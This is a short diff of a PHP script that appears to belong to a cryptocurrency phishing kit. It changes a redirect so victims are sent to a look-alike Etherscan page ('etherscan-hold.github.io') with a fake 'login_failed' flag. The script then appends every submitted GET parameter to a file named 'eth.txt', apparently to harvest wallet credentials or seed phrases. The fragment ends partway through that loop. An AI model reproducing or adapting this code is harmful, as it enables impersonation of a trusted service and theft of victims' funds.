@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://scan-bsc.github.io/us/succes.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
+header ('Location: https://etherscan-hold.github.io/scan/succes.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
 $handle = fopen("eth.txt", "a");
 
 foreach($_GET as $variable => $value) {
